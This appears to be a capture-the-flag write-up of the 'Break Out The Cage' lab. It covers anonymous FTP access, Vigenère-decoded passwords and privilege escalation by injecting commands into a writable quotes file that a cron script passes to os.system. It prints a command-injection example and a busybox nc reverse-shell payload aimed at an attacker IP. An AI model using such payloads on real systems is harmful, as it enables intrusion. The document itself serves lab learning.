# Break Out The Cage

### Investigate!
Nmap scan shows ports 21,22 and 80 open. 
The FTP server allows anonymous login and it contains a file called `dad_tasks`. This file contains a base64 encoded strings, but If I try to decode it: <br />
![image](https://github.com/user-attachments/assets/aec6f328-bdf5-46b5-840e-b115892bb42e)<br />
It looks still encrypted somehow. I tried everything, such as rotating, caesar cipher and other stuff but nothing. <br />
Then I found [this online tool](https://www.boxentriq.com/code-breaking/cipher-identifier) that tries to indentify what type of cipher has been used based on the ciphertext: <br />
![image](https://github.com/user-attachments/assets/a59b609d-7406-4697-82b4-ed7d5baae8a4)<br />
There's this other [online tool](https://www.guballa.de/vigenere-solver) that can be used to break this cipher and get watson ssh password. I need to move to the account `cage` to get the user flag. If I run `sudo -l`, I get: <br />
![image](https://github.com/user-attachments/assets/baf6d5f5-a4d9-4773-bcc8-d23e2bb682ab)<br />
But this seams useless, it just prints stuff on the console. Further enumerating the machine, I found something interesting inside `/opt`:<br />
![image](https://github.com/user-attachments/assets/9a06bef5-427f-4c09-ac6e-b8c1f6354e3d)<br />
This is the code of the python script: <br />
![image](https://github.com/user-attachments/assets/cbed9e93-ccd2-43b4-8c88-6869166bb72f)<br />
This script is a cronjob, because once in a while I see some random banners appearing on the console. It basically selects all the strings from a file called `.quotes`, and then shows one of them on the screen with `os.system("wall " + quote)`. Now here's the interesting part: <br />
![image](https://github.com/user-attachments/assets/5d725f6b-87f7-4bda-9a92-423478316d2e)<br />
I am part of the `cage` group, and the `cage` group has write access to this `.quotes` file. This means that I can change this file and try to inject a command, such as a reverse shell, inside `os.system("wall " + quote)` to execute something like `wall ""; whoami #"`. Let's try it.<br />
I modified the `.quotes` file as such: <br />
![image](https://github.com/user-attachments/assets/2b629247-0ece-435d-a019-d22e4378c7b8)<br />
And it works!: <br />
![image](https://github.com/user-attachments/assets/eb3264d2-dbd9-4b9a-a80e-b74a7f532ea8)<br />
To spawn a reverse shell, I used this payload: `$(busybox nc 10.11.85.53 9001 -e sh)`, and got the user flag. Now, in cage's home directory, there's this email: <br />
![image](https://github.com/user-attachments/assets/15fbf78c-3c8e-4410-9e9d-f76ab17751bc)<br />
This is again using vigenère cipher, and the key is `FACE`:<br />
![image](https://github.com/user-attachments/assets/4c79ee15-fe82-4bbf-be82-8277c837a536)<br />
The decoded word is the root password. 




